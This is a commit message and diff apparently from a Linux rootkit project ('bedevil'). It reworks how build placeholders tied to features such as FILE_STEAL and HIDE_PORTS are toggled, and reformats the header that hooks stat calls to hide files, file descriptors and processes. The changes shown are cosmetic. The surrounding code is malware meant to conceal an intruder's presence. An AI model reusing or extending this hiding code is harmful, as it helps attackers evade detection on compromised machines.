Problems fixed, other stuff & fixes
I've fixed miscellaneous issues.
Moved things about too.
Changed some of the messages that
bedevil.sh will show upon configuration.
This is in an effort to show what's
going on a little bit more intricately.

Previously, includes.h defined what
variable placeholders were ignored and
which were read & overwritten (depending
on the status of its toggle).
i.e.: #include "hooks/open/open.h" // [FILE_STEAL]
Now instead of this... the actual
definition lines of the variables &
their respective placeholder are what
is checked, to see if we need to read
it & overwrite it.
i.e.: #define HIDEPORTS "??HIDEPORTS??" // [HIDE_PORTS]

Additionally, I've moved some stuff
in inc/ around, just to have everything
in more suitable locations.

+++ inc/hiding/files/files.h
@@ -1,12 +1,12 @@
 #ifndef FILES_H
 #define FILES_H
 
-#define mxstat(pathname, s) (long)call(C__XSTAT, _STAT_VER, pathname, s)
-#define mxstat64(pathname, s) (long)call(C__XSTAT64, _STAT_VER, pathname, s)
-#define mfxstat(fd, s) (long)call(C__FXSTAT, _STAT_VER, fd, s)
-#define mfxstat64(fd, s) (long)call(C__FXSTAT64, _STAT_VER, fd, s)
-#define mlxstat(pathname, s) (long)call(C__LXSTAT, _STAT_VER, pathname, s)
-#define mlxstat64(pathname, s) (long)call(C__LXSTAT64, _STAT_VER, pathname, s)
+#define mxstat(pathname, s)    (long)call(C__XSTAT, _STAT_VER, pathname, s)    /* regular path stat */
+#define mxstat64(pathname, s)  (long)call(C__XSTAT64, _STAT_VER, pathname, s)  /* large files       */
+#define mfxstat(fd, s)         (long)call(C__FXSTAT, _STAT_VER, fd, s)         /* fildes stat       */
+#define mfxstat64(fd, s)       (long)call(C__FXSTAT64, _STAT_VER, fd, s)       /* large files...    */
+#define mlxstat(pathname, s)   (long)call(C__LXSTAT, _STAT_VER, pathname, s)   /* link stat         */
+#define mlxstat64(pathname, s) (long)call(C__LXSTAT64, _STAT_VER, pathname, s) /* ...               */
 gid_t get_path_gid(const char *pathname);
 gid_t get_path_gid64(const char *pathname);
 gid_t lget_path_gid(const char *pathname);
@@ -18,17 +18,17 @@ gid_t get_fd_gid64(int fd);
 #define MODE_REG 0x32  /* STAT MODE FOR REGULAR FILES. */
 #define MODE_64  0x64  /* STAT MODE FOR BIG FILES. */
 
-int _hidden_path(const char *pathname, int mode);
-int _f_hidden_path(int fd, int mode);
-int _l_hidden_path(const char *pathname, int mode);
+int _hidden_path(const char *pathname, short mode);
+int _f_hidden_path(int fd, short mode);
+int _l_hidden_path(const char *pathname, short mode);
 int hidden_proc(pid_t pid);
 #include "hidden.c"
 
-#define hidden_path(path) _hidden_path(path, MODE_REG)
-#define hidden_path64(path) _hidden_path(path, MODE_64)
-#define hidden_fd(fd) _f_hidden_path(fd, MODE_REG)
-#define hidden_fd64(fd) _f_hidden_path(fd, MODE_64)
-#define hidden_lpath(path) _l_hidden_path(path, MODE_REG)
+#define hidden_path(path)    _hidden_path(path, MODE_REG)
+#define hidden_path64(path)  _hidden_path(path, MODE_64)
+#define hidden_fd(fd)        _f_hidden_path(fd, MODE_REG)
+#define hidden_fd64(fd)      _f_hidden_path(fd, MODE_64)
+#define hidden_lpath(path)   _l_hidden_path(path, MODE_REG)
 #define hidden_lpath64(path) _l_hidden_path(path, MODE_64)
 
 int chown_path(char *path, gid_t gid){
